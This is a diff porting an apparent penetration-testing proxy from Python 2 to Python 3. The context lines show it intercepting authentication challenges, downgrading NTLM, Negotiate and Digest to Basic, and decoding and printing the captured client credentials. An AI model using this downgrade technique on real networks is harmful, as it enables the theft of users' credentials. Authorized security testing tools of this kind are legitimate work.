@@ -5,7 +5,7 @@ import os
 import re
 
 from base64 import b64decode
-from urlparse import urlparse
+import urllib.parse as urlparse
 
 def color(txt, code = 1, modifier = 0):
 	return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)
@@ -105,9 +105,9 @@ def decode_auth(headers, client, method, uri):
 	if 'Basic' in headers['Authorization']:
 		ip = str(client[0])
 
-		print ""
+		print()
 		decoded = b64decode(headers['Authorization'].split()[1])
-		print color("[+] Received Basic credentials from %s: %s" % (ip, decoded), 2)
+		print(color("[+] Received Basic credentials from %s: %s" % (ip, decoded), 2))
 
 
 		# Handling auth completion
@@ -121,25 +121,25 @@ def decode_auth(headers, client, method, uri):
 				auth = build_digest_header(method, uri, username, password, hdr)
 
 				if auth is not None:
-					print color("[+] Forwarding reconstructed Digest auth to server", 3, 1)
+					print(color("[+] Forwarding reconstructed Digest auth to server", 3, 1))
 					headers['Authorization'] = auth
 
 			if hdr.startswith('NTLM') or hdr.startswith('Negociate'):
-				print color("[+] TODO - not implemeted yet: Calculate NTLM auth from clear text creds", 2, 1)
+				print(color("[+] TODO - not implemeted yet: Calculate NTLM auth from clear text creds", 2, 1))
 
 	return headers
 
 # Do the actual header rewrite
 def downgrade(client, data, code, type):
-	print ""
+	print()
 
 	ip = str(client[0])
 
-	if config.cfg.clients.has_key(ip) and not config.cfg.args.nonstop:
-		print color("[+] Intercepted %d auth request for excluded client %s, ignoring" % (code, ip), 3, 1)
+	if ip in config.cfg.clients and not config.cfg.args.nonstop:
+		print(color("[+] Intercepted %d auth request for excluded client %s, ignoring" % (code, ip), 3, 1))
 		return data
 
-	print color("[+] Intercepted %d auth request for %s, rewriting to Basic" % (code, ip), 3)
+	print(color("[+] Intercepted %d auth request for %s, rewriting to Basic" % (code, ip), 3))
 
 	for m in ['NTLM', 'Negociate', 'Digest']:
 
@@ -163,9 +163,11 @@ def downgrade(client, data, code, type):
 # Rewrite to basic
 def handle_server_response(headers, client, data):
 
+	data = data.decode('utf8')
+
 	if "WWW-Authenticate: Basic" in data or "Proxy-Authenticate: Basic" in data:
-		print ""
-		print color("[+] Intercepted auth request for %s, already Basic, not doing anything" % client[0], 3)
+		print()
+		print(color("[+] Intercepted auth request for %s, already Basic, not doing anything" % client[0], 3))
 		return data
 
 	if data.startswith('HTTP/1.1 401') and 1 in config.cfg.args.levels:
